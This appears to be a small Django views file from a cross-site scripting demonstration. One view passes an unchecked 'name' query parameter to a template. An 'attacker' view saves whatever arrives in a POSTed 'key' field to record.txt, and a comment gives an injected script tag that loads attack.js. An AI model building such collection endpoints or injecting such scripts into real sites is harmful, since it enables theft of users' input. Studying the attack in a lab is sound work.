from django.shortcuts import render
from django.http import HttpResponse


def index(request):
    username = request.GET['name']
    return render(request,"index.html",{"username":username})

def attacker(request):
    # <script src="http://localhost/static/attack.js"></script>
    data = request.POST['key']
    file_handle = open('record.txt',mode='w')
    file_handle.write(data)
    file_handle.close()
    return HttpResponse('...')

